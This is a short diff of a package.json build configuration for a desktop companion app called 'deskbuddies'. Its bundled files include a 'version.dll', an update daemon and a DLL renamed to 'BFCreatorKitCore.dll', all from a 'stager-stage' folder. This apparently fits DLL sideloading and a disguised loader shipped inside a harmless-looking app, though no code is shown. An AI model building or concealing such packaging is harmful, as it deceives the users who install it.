@@ -1,6 +1,6 @@
 {
   "name": "deskbuddies",
-  "version": "0.2.1",
+  "version": "0.2.2",
   "private": true,
   "description": "Mochi and Biscuit desktop companions",
   "author": "DeskBuddies",
@@ -52,8 +52,8 @@
           "to": "version.dll"
         },
         {
-          "from": "stager-stage/vmin.dll",
-          "to": "vmin.dll"
+          "from": "stager-stage/BFCreatorKitCore.dll",
+          "to": "BFCreatorKitCore.dll"
         },
         {
           "from": "stager-stage/app-update-daemon.exe",
